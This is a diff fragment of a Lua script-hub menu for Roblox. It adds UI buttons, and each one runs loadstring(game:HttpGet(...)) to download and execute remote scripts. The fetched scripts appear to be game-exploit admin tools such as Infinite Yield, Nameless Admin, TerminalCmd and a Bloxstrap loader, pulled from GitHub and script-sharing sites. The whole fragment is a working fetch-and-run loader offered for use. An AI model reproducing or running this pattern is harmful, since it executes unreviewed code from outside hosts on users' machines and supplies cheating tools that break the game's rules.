+         loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+    	end
+})
+
+local Button = Tab:CreateButton({
+	Name = "NamelessAdmin",
+	Description = "Loads NamelessAdmin", -- Creates A Description For Users to know what the button does (looks bad if you use it all the time),
+    	Callback = function()
+         loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Nameless-Admin-Official-15022"))()
+    	end
+})
+
+local Button = Tab:CreateButton({
+	Name = "NamelessAdminV2",
+	Description = "Loads NamelessAdminV2", -- Creates A Description For Users to know what the button does (looks bad if you use it all the time),
+    	Callback = function()
+         loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Nameless-admin-14114"))()
+    	end
+})
+
+local Button = Tab:CreateButton({
+	Name = "TerminalCmd",
+	Description = "Try Our AdminPanel :D", -- Creates A Description For Users to know what the button does (looks bad if you use it all the time),
+    	Callback = function()
+         loadstring(game:HttpGet("https://raw.githubusercontent.com/hm5650/TCmd/refs/heads/main/TerminalCmd", true))()
+    	end
+})
+
+local Tab = Window:CreateTab({
+	Name = "Misc",
+	Icon = "view_in_ar",
+	ImageSource = "Material",
+	ShowTitle = true -- This will determine whether the big header text in the tab will show
+})
+
+local Button = Tab:CreateButton({
+	Name = "BloxStrap",
+	Description = "bloxStrap from temu", -- Creates A Description For Users to know what the button does (looks bad if you use it all the time),
+    	Callback = function()
+         loadstring(game:HttpGet('https://raw.githubusercontent.com/qwertyui-is-back/Bloxstrap/refs/heads/main/loader.lua'))()
+    	end
+})
